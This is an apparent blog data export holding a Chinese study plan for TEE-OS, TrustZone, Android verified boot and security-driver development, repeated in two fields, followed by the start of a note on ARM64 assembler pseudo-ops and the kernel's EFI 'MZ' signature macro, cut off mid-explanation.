X.509 证书结构、TLS 基础；<br>    •    Key Management（密钥管理）：对关键秘钥的存储和使用策略；<br>    •    常用密码学库：OpenSSL、mbedTLS 等，练习如何生成/验证签名、加解密操作等。</p>\n<p>目标：<br>    •    能熟练运用 C/C++，并对操作系统安全和加密基础有扎实掌握。</p>\n<p>二、深入 ARM 架构与 TrustZone<br>    1.    ARM 架构<br>    •    ARMv7/v8 基础：对 ARM 处理器模式、指令集、特权级别有整体认识；<br>    •    中断、异常：了解 ARM 下异常向量表、异常处理机制等；<br>    •    Memory Management Unit (MMU)、缓存一致性、寄存器管理。<br>    2.    ARM TrustZone 技术<br>    •    TrustZone 基本概念：Normal World / Secure World、Security Extension、TZASC (TrustZone Address Space Controller)。<br>    •    上下文切换：如何在 SMC（Secure Monitor Call）指令的触发下进行世界切换；<br>    •    TEE OS 的结构：Secure Monitor、Secure Kernel、Secure Service / TA（Trusted Application）间的关系。<br>    3.    硬件安全模块<br>    •    了解终端硬件中如何集成 eSE (embedded Secure Element)、TPM (Trusted Platform Module) 等；<br>    •    在移动设备上常见的安全元件架构（如 Apple 的 Secure Enclave，安卓的 StrongBox / Titan M 等）。</p>\n<p>目标：<br>    •    深刻理解 TrustZone 的安全模型与机制，为后续研究 TEE OS 打好基础。</p>\n<p>三、TEE-OS 安全业务与开发<br>    1.    TEE-OS 原理与架构<br>    •    常见 TEE 方案：OP-TEE、Kinibi、QSEE、Trusty 等；<br>    •    学习其启动流程、 TA (Trusted Application) 生命周期、内存隔离、IPC 调用方式。<br>    •    熟悉 GlobalPlatform TEE 规范：包括 TEE Client API、TEE Internal Core API、TEE Secure Element API 等。<br>    2.    安全子系统（生物识别、支付、TUI、HDCP、StrongBox）<br>    •    生物识别（指纹/人脸）：<br>    •    了解传感器驱动到 TEE 中算法处理的流程、如何在安全环境中存储/对比生物特征；<br>    •    重点掌握 TEE 生物识别相关的认证流程和隐私保护策略。<br>    •    移动支付 / NFC 支付：<br>    •    与 TEE 结合实现安全支付，如主流 HCE（Host Card Emulation）或 eSE 做法；<br>    •    TUI (Trusted User Interface)：<br>    •    在输入 PIN / 密码时，如何进入安全模式防截屏、防篡改；<br>    •    可能需要和图形栈、显示驱动结合，确保显示/触摸事件在 Secure World 处理。<br>    •    HDCP：<br>    •    学习内容保护机制、key 流程，如何在 TEE 中完成加密、解密和认证；<br>    •    StrongBox：<br>    •    Android 平台提供的硬件级密钥存储，结合 TEE（或独立安全芯片）确保 Key 的不可导出。<br>    •    熟悉 Keymaster / StrongBox Keymaster API。<br>    3.    防篡改、防逆向<br>    •    常见的“安全白盒”方案/代码混淆思路，可在 TEE 中执行关键操作；<br>    •    研究安全启动链：从 Bootloader -&gt; AVB (Android Verified Boot) -&gt; dm-verity -&gt; OS 加载的完整性保护机制。</p>\n<p>目标：<br>    •    熟悉 TEE OS 工作原理、能开发或调试 Trusted Application；<br>    •    能基于 TEE 架构实施生物识别、支付、内容保护等安全业务的设计与集成。</p>\n<p>四、Android 系统安全（AVB、dm-verity 等）<br>    1.    Android Verified Boot (AVB)<br>    •    了解 Bootloader 分级加载和分区签名验证流程；<br>    •    研究 vbmeta、boot、system 等分区如何对其完整性和签名进行验证；<br>    •    掌握如何定制 AVB 策略、签名工具（avbtool）。<br>    2.    dm-verity<br>    •    明白 dm-verity 的设备映射原理、如何对文件系统（system、vendor 等分区）进行哈希校验；<br>    •    配置和编译内核支持 dm-verity，调试相关故障。<br>    3.    Android Security Model<br>    •    SELinux 策略编写、权限管理；<br>    •    System Services / HAL 与 TEE、keystore 交互；<br>    •    Android KeyStore / StrongBox API 的使用。<br>    4.    内核安全防护<br>    •    KASLR、SELinux、seccomp、AppArmor（在某些发行版中）等安全机制；<br>    •    常见内核漏洞成因及修复策略。</p>\n<p>目标：<br>    •    能在 Android 平台上进行安全加固，理解从 Bootloader 到文件系统完整性的链式验证；<br>    •    能对系统进行定制化安全功能（如自定义签名策略、内核强化等）。</p>\n<p>五、Linux/RTOS 驱动开发与调试<br>    1.    Linux 驱动开发<br>    •    驱动模型与设备树（Device Tree），字符设备 / 块设备 / 网络设备驱动的区别；<br>    •    常见接口：I2C、SPI、UART、GPIO 等；<br>    •    了解内核态内存管理、竞争同步、调试技巧（printk、ftrace、kgdb 等）。<br>    2.    嵌入式 RTOS 驱动<br>    •    如果安全模块运行在某些小型 RTOS（如 FreeRTOS、ThreadX、Zephyr 等），需学习其任务调度、驱动框架、与硬件寄存器交互方式。<br>    •    结合硬件手册进行移植和优化。<br>    3.    安全驱动<br>    •    例如 TUI 驱动、Secure Monitor 驱动、Crypto Engine 驱动等，如何与 TrustZone 或 TEE OS 交互；<br>    •    解决调试权限问题（Secure World / Non-Secure World），可能需要编写特定的 SMC 调用适配层。</p>\n<p>目标：<br>    •    能编写或移植底层驱动，理解硬件与软件系统交互；<br>    •    掌握在安全环境下进行驱动开发/调试的要点（如权限、内存保护）。</p>\n<p>六、安全认证与测试<br>    1.    安全认证相关标准<br>    •    了解 FIPS 140-2/3、CC EAL (Common Criteria) 等认证体系；<br>    •    知晓行业常见安全认证要求（金融支付、移动终端安全等），如 PCI DSS、EMVCo、UnionPay 规范等。<br>    2.    渗透测试、攻防测试<br>    •    学习常见的逆向分析、调试、内存注入、漏洞利用方式；<br>    •    熟悉移动端常见的安全攻防手段（Magisk、Xposed、Hook、Rootkit 等），以及如何对抗这些攻击；<br>    •    工具：IDA Pro、Ghidra、Frida、AFL（模糊测试）等。<br>    3.    系统分析工具<br>    •    Android 平台调试：logcat、adb shell、systrace、Perfetto 等；<br>    •    内核调试：gdb、ftrace、KGDB；<br>    •    代码审计工具：SonarQube、Cppcheck、Coverity。</p>\n<p>目标：<br>    •    能够从对抗的角度审视安全方案的脆弱点；<br>    •    具备基本的渗透测试思维，在设计、实现阶段就避免常见漏洞。</p>\n<p>七、项目实践与综合运用<br>    1.    实践项目选题<br>    •    开发一个简易 TEE 应用：比如在 OP-TEE 上编写 TA，实现对称加解密或密钥管理，然后在 Normal World 写 client 测试；<br>    •    移植并自定义 AVB 或 dm-verity：配置一个自定义签名的引导流程；<br>    •    生物识别集成：与指纹/人脸传感器驱动联动，将核心算法和特征匹配放在 Secure World；<br>    •    安全驱动：为一个虚拟硬件加密模块写 Linux 驱动，并通过 SMC 调用到 TEE 中完成加解密。<br>    2.    文档与设计<br>    •    在做项目时多写设计文档、Threat Modeling，用数据流图和攻击面分析工具来评估安全风险。<br>    •    学习如何编写安全需求说明书、如何通过单元测试/集成测试验证安全功能的正确性和鲁棒性。<br>    3.    开源社区交流<br>    •    多关注 GitHub/社区上的 TEE 相关项目（OP-TEE、libtee、Trusty 等），阅读源码和 issue；<br>    •    学习其他开发者的实现思路与安全要点，及时跟进社区最新补丁与安全通告。</p>\n<p>八、持续提升与进阶<br>    1.    跟进最新行业动态<br>    •    关注 Android Security Bulletin、CVE 等安全漏洞公告；<br>    •    学习顶会/黑客大会演讲（Black Hat、DEF CON、CanSecWest 等）里对移动终端和 TEE 攻击思路的前沿分享。<br>    2.    纵深防御<br>    •    除了 TEE 层，还可学习 container、虚拟化技术（KVM、Hypervisor）对安全加固的意义。<br>    •    研究微架构安全问题（Meltdown、Spectre 等）及其缓解措施。<br>    3.    获取专业认证（可选）<br>    •    如果工作中涉及国际/金融安全标准，可关注 FIPS 140-2/3, CC EAL 评估流程，或类似的产品安全认证过程；<br>    •    也可考虑通用安全认证如 CISSP、OSCP（偏渗透）等做综合提升（可根据职业方向选择是否深入）。</p>\n<p>总结</p>\n<p>根据岗位描述，你需要兼顾系统安全、驱动开发、TEE-OS 业务、渗透/攻防等多重技能。上面给出的学习规划从基础到进阶，涵盖了：<br>    1.    操作系统与加密基础<br>    2.    ARM 架构与 TrustZone<br>    3.    TEE-OS 关键安全业务<br>    4.    Android 系统安全<br>    5.    Linux/RTOS 驱动开发<br>    6.    安全认证与攻防测试<br>    7.    实战项目和综合运用<br>    8.    持续进阶与社区交流</p>\n<p>在此过程中，建议你边学边做，以项目实践和代码调试为导向来加深理解。也要结合单位的真实项目需求（如支付、门禁或 DRM）来进行定制化学习，在解决实际问题中提升安全开发与系统整合能力。祝你学习与工作顺利，早日成为这一领域的专家！</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>以下是一份为期 12 个月左右的学习路径和时间规划，涵盖岗位所需的关键技能（TEE-OS、安全子系统、Android 系统安全、Linux/RTOS 驱动开发、密码学、渗透测试等）。在此基础上，你可根据实际情况（工作项目进度、个人掌握速度等）进行微调。整体分为 4 个阶段，每个阶段 3 个月左右。</p>\n<p>第一阶段（第 1~3 个月）：夯实基础</p>\n<p>目标：C/C++ 能力、操作系统与安全概念、初步了解 ARM 体系结构和基本密码学原理。<br>    1.    第 1 个月：C/C++ 加强 &amp; 操作系统原理<br>    •    C/C++ 回顾与强化<br>    •    熟练掌握指针、内存管理、面向对象、多线程编程；<br>    •    学习常见库函数与 STL 容器；<br>    •    练习编译/链接过程，使用 GDB、LLDB 调试工具；<br>    •    建议完成一些 LeetCode（或算法题）以及 简单命令行工具 开发提升综合运用。<br>    •    操作系统与进程/线程安全<br>    •    学习《Operating System Concepts》或《Modern Operating Systems》中的进程管理、内存管理、文件系统、安全机制；<br>    •    了解用户态/内核态的概念、Linux 的权限模型（UID/GID）和权限分级。<br>    2.    第 2 个月：ARM 架构基础 &amp; Linux 驱动初步<br>    •    ARM 架构入门<br>    •    阅读《ARMv7/ARMv8 Architecture Reference Manual》的基础章节，了解寄存器、异常模式、指令集（只需了解常用指令）；<br>    •    搭建一个 QEMU + ARM 环境，尝试编译一个简易的 Linux Kernel 运行在 QEMU 中，熟悉交叉编译流程。<br>    •    Linux 驱动开发初步<br>    •    学习 LDD3 (Linux Device Drivers 3rd Ed.)（或更新）前几章，了解字符设备、内核日志（printk）调试；<br>    •    试着写一个简单的 字符设备驱动，练习编译内核模块、插拔模块（insmod/rmmod）。<br>    3.    第 3 个月：密码学和安全模型<br>    •    对称加密 / 非对称加密 / 哈希<br>    •    学习 AES、DES、RSA、ECC、SHA-256 等基础算法原理；<br>    •    实验：使用 OpenSSL 或 mbedTLS 写小段代码完成加解密、签名验签、哈希运算；<br>    •    了解 PKI / 证书（X.509）基础知识，知道如何生成自签名证书。<br>    •    安全模型和访问控制<br>    •    熟悉 Linux 中的 DAC、MAC（SELinux / AppArmor） 概念；<br>    •    大体了解 Android 安全模型（应用沙箱、权限机制）。</p>\n<p>第二阶段（第 4~6 个月）：深入 ARM TrustZone 与 TEE-OS</p>\n<p>目标：掌握 TrustZone 原理，能在主流 TEE-OS（如 OP-TEE、QSEE、Trusty）上进行开发调试；理解生物识别、支付等安全业务如何在 TEE 中实现。<br>    1.    第 4 个月：TrustZone 基本机制<br>    •    TrustZone 关键概念<br>    •    Normal World / Secure World、SMC（Secure Monitor Call）、中断处理、TZASC、内存隔离；<br>    •    参考文档：ARM 官方的 Security Extensions Reference，或社区项目的博客/资料。<br>    •    搭建实验环境<br>    •    可选择 OP-TEE（开源且文档相对完善）在 QEMU 或者特定开发板（如 Raspberry Pi 3/4，HiKey960 等）上搭建；<br>    •    跑通一个 Hello World TA（Trusted Application），从 Normal World 调用 Secure World 的接口。<br>    2.    第 5 个月：TEE OS 框架与 TA 开发<br>    •    OP-TEE / Trusty / QSEE 原理<br>    •    学习 TEE 的进程管理、RPC 机制、存储安全等；<br>    •    阅读 GlobalPlatform TEE 标准：Client API、Internal Core API、Security Extensions。<br>    •    TA 编程实践<br>    •    编写一个简易 TA，封装 AES 加密/解密或 HMAC 生成；<br>    •    在 Normal World 写 Client 程序，通过 TEE Client API 与 TA 通信；<br>    •    练习调试 TA：查看日志、设置断点等。<br>    3.    第 6 个月：安全子系统（生物识别、支付、TUI、HDCP、StrongBox）<br>    •    生物识别 &amp; TUI<br>    •    了解指纹/人脸识别在 TEE 中的典型实现：特征点存储、匹配流程、TUI 防截屏；<br>    •    学习供应商/OP-TEE 提供的 例程或文档（如指纹 TA 示例）。<br>    •    移动支付 / DRM（HDCP）<br>    •    掌握 NFC 支付、Token 化 流程；<br>    •    HDCP 大体原理：在 Secure World 中实现密钥交换与内容解密。<br>    •    StrongBox<br>    •    Android 的 StrongBox Keymaster / Gatekeeper：在硬件安全单元里完成密钥存储和验证；<br>    •    学习 Android Key Attestation、SafetyNet 原理。</p>\n<p>第三阶段（第 7~9 个月）：Android 安全加固与驱动高级调试</p>\n<p>目标：对 Android 系统安全（AVB、dm-verity、SELinux 政策）有深刻理解，具备编写和调试更复杂的安全驱动或 RTOS 驱动的能力。<br>    1.    第 7 个月：Android 系统安全<br>    •    AVB (Android Verified Boot)<br>    •    阅读官方文档 &amp; 源码（AOSP 中 bootable/bootloader/*、system/core/avb 等），了解引导链、vbmeta、签名校验；<br>    •    实践：编译一个自定义 AVB 启动流程，对 boot.img、system.img 签名并进行校验。<br>    •    dm-verity<br>    •    学习 dm-verity 工作原理（内核 device-mapper），如何实时校验文件系统数据完整性；<br>    •    配置内核选项 CONFIG_DM_VERITY 并在编译时将 rootfs 或 system 分区打包成带校验树的镜像。<br>    2.    第 8 个月：SELinux 策略 &amp; KeyStore<br>    •    SELinux<br>    •    理解 DAC vs. MAC，掌握 SELinux 中的 type、domain、rule 等概念；<br>    •    修改 AOSP SELinux 策略文件（system/sepolicy），给自定义服务或驱动分配合适权限；<br>    •    使用 adb shell dmesg, adb logcat 分析 SELinux 拒绝日志（avc: denied）。<br>    •    Android KeyStore / StrongBox<br>    •    学习 Android 在用户态如何调用 KeyStore 服务（system/security/keystore），实际调用 TEE Keymaster TA；<br>    •    练习：在 App 层使用 KeyGenerator/KeyPairGenerator 创建硬件级密钥，并进行签名加密。<br>    3.    第 9 个月：Linux/RTOS 驱动进阶<br>    •    多线程 &amp; 同步<br>    •    内核同步机制（spinlock、mutex、semaphore、rwlock 等），注意死锁与竞态调试；<br>    •    高阶驱动特性<br>    •    DMA、PCI(e) / USB / I2C / SPI 驱动编写；<br>    •    学习 Device Tree，为目标开发板编写 DT 配置；<br>    •    RTOS 驱动<br>    •    选一个简单 RTOS（如 FreeRTOS、Zephyr），查看其驱动架构，移植一个小型驱动（如 LED、串口、I2C 设备等）。</p>\n<p>第四阶段（第 10~12 个月）：安全认证、攻防测试与项目实战</p>\n<p>目标：对系统进行安全评估与渗透测试；完成一到两个综合性项目，检验前面所学。<br>    1.    第 10 个月：安全认证与渗透测试<br>    •    行业安全标准<br>    •    了解 FIPS 140-2/3、Common Criteria (CC EAL)、EMVCo 等，对相关流程有大体认知；<br>    •    学习如何准备认证文档，如安全目标 (Security Target)、威胁模型、受评估范围定义等。<br>    •    攻防测试<br>    •    学习常见逆向分析工具：IDA Pro、Ghidra、Frida 等；<br>    •    在测试手机/开发板上，尝试对自研 TEE APP 或安全驱动做渗透模拟（Hook、内存修改、文件篡改等），检查安全缺陷。<br>    •    安全审计<br>    •    使用 Cppcheck / Coverity 等工具对 C/C++ 代码进行静态分析，修复潜在风险。<br>    2.    第 11 个月：项目实战（示例项目）<br>    •    项目 A：Android + TEE 通信 &amp; 生物识别<br>    •    在 OP-TEE/Trusty 上实现一个生物识别 TA（或与已有 TA 对接），在 Normal World 写服务管理流程；<br>    •    将采集到的指纹/人脸特征数据送入 TEE 进行匹配，并验证结果。<br>    •    项目 B：自定义 AVB + dm-verity<br>    •    在一块 ARM 开发板上编译自定义引导（u-boot 或 bootloader），集成 AVB；<br>    •    为 system 分区配置 dm-verity 并验证启动成功后进行修改测试，观察系统是否能检测出篡改。<br>    3.    第 12 个月：总结与深化<br>    •    总结<br>    •    整理项目中遇到的难点（驱动、密钥管理、性能、调试），撰写技术博客或学习笔记；<br>    •    深化<br>    •    规划下一个阶段的横向拓展：研究 Hypervisor / 虚拟化安全、更多硬件安全模块（TPM、eSE）等；<br>    •    或更纵向专攻某块领域（如生物识别算法加速、支付安全、DRM 内容保护等）。</p>\n<p>参考资料与工具<br>    •    操作系统 &amp; 驱动<br>    •    《Linux Device Drivers》 (LDD3)<br>    •    《Understanding the Linux Kernel》<br>    •    ARM 官方手册、QEMU、GDB<br>    •    TrustZone &amp; TEE<br>    •    OP-TEE 官方文档、GitHub: OP-TEE/manifest<br>    •    ARMv8 Security Extensions Reference Manual<br>    •    GlobalPlatform TEE Specifications<br>    •    Android 安全<br>    •    AOSP 源码阅读<br>    •    Android Developers 文档下的 Security、AVB、dm-verity、SELinux<br>    •    Android Security Bulletins<br>    •    密码学<br>    •    《Applied Cryptography》 by Bruce Schneier<br>    •    OpenSSL / mbedTLS 源码、FIPS 140-2/3 文档<br>    •    渗透测试 &amp; 攻防<br>    •    《The Art of Software Security Assessment》<br>    •    IDA Pro、Ghidra、Frida、AFL (Fuzzing) 等常用工具<br>    •    认证 &amp; 规范<br>    •    Common Criteria、FIPS、EMVCo、PCI DSS 等官方文档</p>\n<p>如何执行与保持进度<br>    1.    每月/每周有明确目标：如“本周完成 OP-TEE 上 HelloWorld TA”，下周再做 AES-TA。<br>    2.    做笔记与复盘：关键项目/技术点写成文档或博客，便于回顾与知识积累。<br>    3.    结合实际项目：若工作中有真实 TEE/安全驱动需求，尽量将计划与业务需求结合，效率更高。<br>    4.    灵活调整：若某部分进展快或慢，及时优化计划，不必拘泥于固定月份。</p>\n<p>通过上述4 个阶段、12 个月的循序渐进规划，你可以全面提升在安全子系统、TEE-OS、Android 系统安全以及Linux/RTOS 驱动开发方面的能力。过程中不断实践、调试、总结，就能为今后承担平台安全架构、关键驱动开发、乃至主导安全认证打下坚实基础。祝学习顺利、早日成为这个领域的专家！</p>\n<p>下面给出一个较系统、循序渐进的学习规划，帮助你围绕安全子系统、TEE-OS 等方向夯实基础、扩展技能。在实际执行中，可根据个人情况灵活调整节奏和侧重点。</p>\n<p>一、计算机与操作系统安全基础<br>    1.    补充计算机基础知识<br>    •    编译原理、操作系统原理、计算机体系结构：夯实对 CPU、内存管理、进程/线程调度、文件系统等底层概念的理解。<br>    •    语言能力：C/C++ 是核心开发语言，可以结合小型项目（如移植某些开源库）来强化语法、调试能力，同时了解一点编译器、链接器的工作原理。汇编基础可以从 ARM 汇编入门（简单了解寄存器、常用指令）开始。<br>    2.    操作系统安全概念<br>    •    安全模型（MAC、DAC）：学习 Linux 中的 SELinux / AppArmor 等强制访问控制模型；<br>    •    用户态与内核态：了解系统调用流程和权限隔离；<br>    •    Root、Sandbox、权限管理：尤其在移动端（Android）如何实现应用沙箱、权限隔离；<br>    •    软件完整性保护：如签名校验、可执行文件验证等。<br>    3.    加密与认证基础<br>    •    对称加密（AES、DES）、非对称加密（RSA、ECC）、哈希算法（SHA 系列）等；<br>    •    PKI/证书体系，常见的 X.509 证书结构、TLS 基础；<br>    •    Key Management（密钥管理）：对关键秘钥的存储和使用策略；<br>    •    常用密码学库：OpenSSL、mbedTLS 等，练习如何生成/验证签名、加解密操作等。</p>\n<p>目标：<br>    •    能熟练运用 C/C++，并对操作系统安全和加密基础有扎实掌握。</p>\n<p>二、深入 ARM 架构与 TrustZone<br>    1.    ARM 架构<br>    •    ARMv7/v8 基础：对 ARM 处理器模式、指令集、特权级别有整体认识；<br>    •    中断、异常：了解 ARM 下异常向量表、异常处理机制等；<br>    •    Memory Management Unit (MMU)、缓存一致性、寄存器管理。<br>    2.    ARM TrustZone 技术<br>    •    TrustZone 基本概念：Normal World / Secure World、Security Extension、TZASC (TrustZone Address Space Controller)。<br>    •    上下文切换：如何在 SMC（Secure Monitor Call）指令的触发下进行世界切换；<br>    •    TEE OS 的结构：Secure Monitor、Secure Kernel、Secure Service / TA（Trusted Application）间的关系。<br>    3.    硬件安全模块<br>    •    了解终端硬件中如何集成 eSE (embedded Secure Element)、TPM (Trusted Platform Module) 等；<br>    •    在移动设备上常见的安全元件架构（如 Apple 的 Secure Enclave，安卓的 StrongBox / Titan M 等）。</p>\n<p>目标：<br>    •    深刻理解 TrustZone 的安全模型与机制，为后续研究 TEE OS 打好基础。</p>\n<p>三、TEE-OS 安全业务与开发<br>    1.    TEE-OS 原理与架构<br>    •    常见 TEE 方案：OP-TEE、Kinibi、QSEE、Trusty 等；<br>    •    学习其启动流程、 TA (Trusted Application) 生命周期、内存隔离、IPC 调用方式。<br>    •    熟悉 GlobalPlatform TEE 规范：包括 TEE Client API、TEE Internal Core API、TEE Secure Element API 等。<br>    2.    安全子系统（生物识别、支付、TUI、HDCP、StrongBox）<br>    •    生物识别（指纹/人脸）：<br>    •    了解传感器驱动到 TEE 中算法处理的流程、如何在安全环境中存储/对比生物特征；<br>    •    重点掌握 TEE 生物识别相关的认证流程和隐私保护策略。<br>    •    移动支付 / NFC 支付：<br>    •    与 TEE 结合实现安全支付，如主流 HCE（Host Card Emulation）或 eSE 做法；<br>    •    TUI (Trusted User Interface)：<br>    •    在输入 PIN / 密码时，如何进入安全模式防截屏、防篡改；<br>    •    可能需要和图形栈、显示驱动结合，确保显示/触摸事件在 Secure World 处理。<br>    •    HDCP：<br>    •    学习内容保护机制、key 流程，如何在 TEE 中完成加密、解密和认证；<br>    •    StrongBox：<br>    •    Android 平台提供的硬件级密钥存储，结合 TEE（或独立安全芯片）确保 Key 的不可导出。<br>    •    熟悉 Keymaster / StrongBox Keymaster API。<br>    3.    防篡改、防逆向<br>    •    常见的“安全白盒”方案/代码混淆思路，可在 TEE 中执行关键操作；<br>    •    研究安全启动链：从 Bootloader -&gt; AVB (Android Verified Boot) -&gt; dm-verity -&gt; OS 加载的完整性保护机制。</p>\n<p>目标：<br>    •    熟悉 TEE OS 工作原理、能开发或调试 Trusted Application；<br>    •    能基于 TEE 架构实施生物识别、支付、内容保护等安全业务的设计与集成。</p>\n<p>四、Android 系统安全（AVB、dm-verity 等）<br>    1.    Android Verified Boot (AVB)<br>    •    了解 Bootloader 分级加载和分区签名验证流程；<br>    •    研究 vbmeta、boot、system 等分区如何对其完整性和签名进行验证；<br>    •    掌握如何定制 AVB 策略、签名工具（avbtool）。<br>    2.    dm-verity<br>    •    明白 dm-verity 的设备映射原理、如何对文件系统（system、vendor 等分区）进行哈希校验；<br>    •    配置和编译内核支持 dm-verity，调试相关故障。<br>    3.    Android Security Model<br>    •    SELinux 策略编写、权限管理；<br>    •    System Services / HAL 与 TEE、keystore 交互；<br>    •    Android KeyStore / StrongBox API 的使用。<br>    4.    内核安全防护<br>    •    KASLR、SELinux、seccomp、AppArmor（在某些发行版中）等安全机制；<br>    •    常见内核漏洞成因及修复策略。</p>\n<p>目标：<br>    •    能在 Android 平台上进行安全加固，理解从 Bootloader 到文件系统完整性的链式验证；<br>    •    能对系统进行定制化安全功能（如自定义签名策略、内核强化等）。</p>\n<p>五、Linux/RTOS 驱动开发与调试<br>    1.    Linux 驱动开发<br>    •    驱动模型与设备树（Device Tree），字符设备 / 块设备 / 网络设备驱动的区别；<br>    •    常见接口：I2C、SPI、UART、GPIO 等；<br>    •    了解内核态内存管理、竞争同步、调试技巧（printk、ftrace、kgdb 等）。<br>    2.    嵌入式 RTOS 驱动<br>    •    如果安全模块运行在某些小型 RTOS（如 FreeRTOS、ThreadX、Zephyr 等），需学习其任务调度、驱动框架、与硬件寄存器交互方式。<br>    •    结合硬件手册进行移植和优化。<br>    3.    安全驱动<br>    •    例如 TUI 驱动、Secure Monitor 驱动、Crypto Engine 驱动等，如何与 TrustZone 或 TEE OS 交互；<br>    •    解决调试权限问题（Secure World / Non-Secure World），可能需要编写特定的 SMC 调用适配层。</p>\n<p>目标：<br>    •    能编写或移植底层驱动，理解硬件与软件系统交互；<br>    •    掌握在安全环境下进行驱动开发/调试的要点（如权限、内存保护）。</p>\n<p>六、安全认证与测试<br>    1.    安全认证相关标准<br>    •    了解 FIPS 140-2/3、CC EAL (Common Criteria) 等认证体系；<br>    •    知晓行业常见安全认证要求（金融支付、移动终端安全等），如 PCI DSS、EMVCo、UnionPay 规范等。<br>    2.    渗透测试、攻防测试<br>    •    学习常见的逆向分析、调试、内存注入、漏洞利用方式；<br>    •    熟悉移动端常见的安全攻防手段（Magisk、Xposed、Hook、Rootkit 等），以及如何对抗这些攻击；<br>    •    工具：IDA Pro、Ghidra、Frida、AFL（模糊测试）等。<br>    3.    系统分析工具<br>    •    Android 平台调试：logcat、adb shell、systrace、Perfetto 等；<br>    •    内核调试：gdb、ftrace、KGDB；<br>    •    代码审计工具：SonarQube、Cppcheck、Coverity。</p>\n<p>目标：<br>    •    能够从对抗的角度审视安全方案的脆弱点；<br>    •    具备基本的渗透测试思维，在设计、实现阶段就避免常见漏洞。</p>\n<p>七、项目实践与综合运用<br>    1.    实践项目选题<br>    •    开发一个简易 TEE 应用：比如在 OP-TEE 上编写 TA，实现对称加解密或密钥管理，然后在 Normal World 写 client 测试；<br>    •    移植并自定义 AVB 或 dm-verity：配置一个自定义签名的引导流程；<br>    •    生物识别集成：与指纹/人脸传感器驱动联动，将核心算法和特征匹配放在 Secure World；<br>    •    安全驱动：为一个虚拟硬件加密模块写 Linux 驱动，并通过 SMC 调用到 TEE 中完成加解密。<br>    2.    文档与设计<br>    •    在做项目时多写设计文档、Threat Modeling，用数据流图和攻击面分析工具来评估安全风险。<br>    •    学习如何编写安全需求说明书、如何通过单元测试/集成测试验证安全功能的正确性和鲁棒性。<br>    3.    开源社区交流<br>    •    多关注 GitHub/社区上的 TEE 相关项目（OP-TEE、libtee、Trusty 等），阅读源码和 issue；<br>    •    学习其他开发者的实现思路与安全要点，及时跟进社区最新补丁与安全通告。</p>\n<p>八、持续提升与进阶<br>    1.    跟进最新行业动态<br>    •    关注 Android Security Bulletin、CVE 等安全漏洞公告；<br>    •    学习顶会/黑客大会演讲（Black Hat、DEF CON、CanSecWest 等）里对移动终端和 TEE 攻击思路的前沿分享。<br>    2.    纵深防御<br>    •    除了 TEE 层，还可学习 container、虚拟化技术（KVM、Hypervisor）对安全加固的意义。<br>    •    研究微架构安全问题（Meltdown、Spectre 等）及其缓解措施。<br>    3.    获取专业认证（可选）<br>    •    如果工作中涉及国际/金融安全标准，可关注 FIPS 140-2/3, CC EAL 评估流程，或类似的产品安全认证过程；<br>    •    也可考虑通用安全认证如 CISSP、OSCP（偏渗透）等做综合提升（可根据职业方向选择是否深入）。</p>\n<p>总结</p>\n<p>根据岗位描述，你需要兼顾系统安全、驱动开发、TEE-OS 业务、渗透/攻防等多重技能。上面给出的学习规划从基础到进阶，涵盖了：<br>    1.    操作系统与加密基础<br>    2.    ARM 架构与 TrustZone<br>    3.    TEE-OS 关键安全业务<br>    4.    Android 系统安全<br>    5.    Linux/RTOS 驱动开发<br>    6.    安全认证与攻防测试<br>    7.    实战项目和综合运用<br>    8.    持续进阶与社区交流</p>\n<p>在此过程中，建议你边学边做，以项目实践和代码调试为导向来加深理解。也要结合单位的真实项目需求（如支付、门禁或 DRM）来进行定制化学习，在解决实际问题中提升安全开发与系统整合能力。祝你学习与工作顺利，早日成为这一领域的专家！</p>\n"},{"_content":"\n```s\n\t.macro\tefi_signature_nop\n#ifdef CONFIG_EFI\n.L_head:\n\t/*\n\t * This ccmp instruction has no meaningful effect except that\n\t * its opcode forms the magic \"MZ\" signature required by UEFI.\n\t */\n\tccmp\tx18, #0, #0xd, pl\n#else\n\t/*\n\t * Bootloaders may inspect the opcode at the start of the kernel\n\t * image to decide if the kernel is capable of booting via UEFI.\n\t * So put an ordinary NOP here, not the \"MZ..\" pseudo-nop above.\n\t */\n\tnop\n#endif\n\t.endm\n```\n### .的用法\n在汇编语言中，指令和伪指令（pseudo-ops）通常以 . 开头。它们的作用是帮助汇编器识别代码结构，定义数据类型，声明宏，分配内存空间等。以下是 .macro、.endm、.set、.long、.short 等伪指令的含义和 . 的用法。\n\n1. .macro 和 .endm\n\n\t•\t.macro：用于定义一个宏。宏是一段可以重复调用的代码模板，通过 .macro 开始定义，后面跟上宏的名称和可选的参数。\n\t•\t.endm：用于结束宏定义，表示宏的结束。\n\n示例：\n\n.macro my_macro, param1, param2\n    mov x0, \\param1\n    add x1, x0, \\param2\n.endm\n\n在上面的代码中，定义了一个名为 my_macro 的宏，接受两个参数 param1 和 param2。\n\n2. .set\n\n\t•\t.set：用于定义或修改符号的值。它类似于变量赋值，可以在代码中重复使用，也可以作为标签的偏移量等用途。\n\n示例：\n\n.set my_value, 100\nmov x0, #my_value   // 使用my_value代替100\n\n在这里，my_value 被设置为 100，以后可以用它来代替 100。\n\n3. .long 和 .short\n\n\t•\t.long：用于声明 4 字节（32位）数据，通常表示一个 32 位整数或地址。\n\t•\t.short：用于声明 2 字节（16位）数据，通常表示一个 16 位整数。\n\n示例：\n\n.long 0x12345678  // 定义一个32位数据\n.short 0x1234     // 定义一个16位数据\n\n在上面的例子中，.long 分配了 4 个字节存储 0x12345678，.short 分配了 2 个字节存储 0x1234。\n\n4. . 的用法\n\n. 表示“当前地址”或“当前位置”。它可以在汇编代码中表示当前的汇编位置，用于计算偏移量。\n\n示例：\n\n.label_start:\n    .long . - .label_start\n\n在这个例子中，. - .label_start 计算了当前地址和 label_start 标签的偏移量。\n\n其他常见伪指令\n\n\t•\t.ascii：定义不带终止符的字符串。\n\t•\t.asciz：定义带有 NUL（空字符）结尾的字符串。\n\t•\t.align：用于内存对齐，将地址对齐到指定的边界。\n\n总结：这些伪指令和 . 符号在汇编中提供了灵活性和结构化，帮助汇编器处理各种数据布局和宏定义，简化代码。\n\n### ccmp 指令 // todo\nccmp 指令在 ARM64 架构中是一种条件比较指令，它的全称是 “Conditional Compare”（条件比较），用于根据条件标志执行比较操作。这条指令允许在单个指令中同时进行比较和条件标志更新，这在减少分支和提高指令执行效率方面非常有用。\n\n指令格式\n\nccmp <操作数1>, <操作数2>, <标志掩码>, <条件>\n\n\t•\t操作数1：通常是一个寄存器，包含要进行比较的第一个操作数。\n\t•\t操作数2：可以是一个立即数（如 